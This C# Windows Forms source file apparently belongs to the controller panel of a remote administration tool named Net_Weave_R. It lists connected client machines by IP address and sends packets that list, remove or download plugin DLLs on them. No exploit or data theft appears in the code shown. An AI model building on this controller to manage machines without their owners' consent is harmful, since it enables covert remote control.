using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Net_Weave_R.Core;
using NetLib.Networking;
using System.IO;
using Net_Weave_R.Forms.Popups;

namespace Net_Weave_R.Forms
{
    public partial class PluginView : Form
    {
        List<Client> clients;
        public PluginView()
        {
            InitializeComponent();
            clients = new List<Client>();
            Icon = GlobalProperties.ApplicationIcon;
            xClients.NodeMouseClick += new TreeNodeMouseClickEventHandler(xClients_NodeMouseClick);
        }

        void xClients_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            TreeNode Node = e.Node;
            lstPlugins.Items.Clear();
            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.PLUGIN_GET);
            w.Write(0);
            ((Client)Node.Tag).Send(w.ToArray(true));
        }
        public void AddClient(Client client)
        {
            client.DataReceived += new EventHandler<DataReceivedEventArgs>(client_DataReceived);
            client.Disconnected += new Client.DisconnectedEventHandler(client_Disconnected);
            TreeNode node = new TreeNode();
            node.Text = client.Address.ToString().Split(':')[0];
            node.Tag = client;
            Invoke((MethodInvoker)delegate
            {
                xClients.Nodes.Add(node);
            });
        }

        void client_Disconnected(Client e)
        {
            RemoveClient(e);
            clients.Remove(e);
        }

        public void RemoveClient(Client client)
        {
            if (this == null || this.IsDisposed)
            {
                client.DataReceived -= client_DataReceived;
                client.Disconnected -= client_Disconnected;
                return;
            }
            foreach (TreeNode node in xClients.Nodes)
            {
                if (node.Tag == client)
                {
                    Invoke((MethodInvoker)delegate
                    {
                        if (node.IsSelected)
                            lstPlugins.Items.Clear();
                        node.Remove();
                    });
                    client.DataReceived -= client_DataReceived;
                    client.Disconnected -= client_Disconnected;
                    clients.Remove(client);
                    break;
                }
            }
        }

        void client_DataReceived(object sender, DataReceivedEventArgs e)
        {
            if (this == null || this.IsDisposed)
            {
                ((Client)sender).DataReceived -= client_DataReceived;
                ((Client)sender).Disconnected -= client_Disconnected;
                return;
            }

            PacketReader r = e.Reader;
            switch ((PacketHeader)e.Header)
            {
                case PacketHeader.PLUGIN_GET:
                    {
                        int header = r.ReadInt32();
                        if (header == 0)
                        {
                            while (r.PeekChar() > 0)
                            {
                                string name = r.ReadString();
                                string des = r.ReadString();
                                string ver = r.ReadString();
                                string author = r.ReadString();
                                string guid = r.ReadString();

                                ListViewItem i = new ListViewItem();
                                i.Text = name;
                                i.SubItems.Add(des);
                                i.SubItems.Add(ver);
                                i.SubItems.Add(author);
                                i.Tag = guid;

                                Invoke((MethodInvoker)delegate { lstPlugins.Items.Add(i); });
                            }
                        }

                        if (header == 1)
                        {
                            int len = r.ReadInt32();
                            byte[] pluginBytes = r.ReadBytes(len);
                            string fileName = r.ReadString();
                            try
                            {
                                File.WriteAllBytes(fileName, pluginBytes);
                                MessageBox.Show(string.Format("Plugin transferred and saved. Path: {0}", fileName), "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.Message, "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                        }
                    }
                    break;
                case PacketHeader.PLUGIN_REMOVE:
                    string removeGuid = r.ReadString();
                    for (int i = 0; i < lstPlugins.Items.Count; i++)
                    {
                        bool b = false;
                        Invoke((MethodInvoker)delegate
                        {
                            if (lstPlugins.Items[i].Tag.ToString() == removeGuid)
                            {
                                lstPlugins.Items.RemoveAt(i);
                                b = true;
                            }
                        });
                        if (b)
                            break;
                    }
                    break;
            }
            r.Close();
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != System.Windows.Forms.DialogResult.Yes)
                return;

            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.PLUGIN_REMOVE);
            w.Write(lstPlugins.SelectedItems[0].Tag.ToString());
            ((Client)xClients.SelectedNode.Tag).Send(w.ToArray(true));
            //DataWriter w = new DataWriter();
            //w.Write(lstPluginData.SelectedItems[0].Tag.ToString());
            //((Client)treeClients.SelectedNode.Tag).Send(new Packet(Client.Header.PLUGIN_REMOVE, w.GetBytes()));
        }

        private void transferToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog d = new SaveFileDialog())
            {
                d.Filter = "DLL |*.dll";
                d.FileName = lstPlugins.SelectedItems[0].Text;
                if (d.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    PacketWriter w = new PacketWriter();
                    w.Write((int)PacketHeader.PLUGIN_GET);
                    w.Write(1);
                    w.Write(lstPlugins.SelectedItems[0].Tag.ToString());
                    w.Write(d.FileName);
                    ((Client)xClients.SelectedNode.Tag).Send(w.ToArray(true));
                    //DataWriter w = new DataWriter();
                    //w.Write(lstPluginData.SelectedItems[0].Tag.ToString());
                    //w.Write(d.FileName);
                    //((Client)treeClients.SelectedNode.Tag).Send(new Packet(Client.Header.PLUGIN_TRANSFER, w.GetBytes()));
                }
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            for (int i = 0; i < clients.Count; i++)
            {
                RemoveClient(clients[i]);
            }
            clients.Clear();
            base.OnFormClosing(e);
        }
    }
}
